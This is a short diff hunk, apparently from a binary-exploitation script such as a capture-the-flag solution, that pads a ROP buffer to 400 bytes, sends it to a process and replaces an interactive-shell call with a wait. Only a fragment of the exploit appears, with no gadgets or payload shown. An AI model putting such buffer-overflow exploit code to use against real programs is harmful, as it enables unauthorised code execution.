@@ -30,4 +30,4 @@ buf += rop.fill(400, buf)
 
 p.write(buf)
 p.write_p64(0)
-p.interact(0)
+p.wait(0)
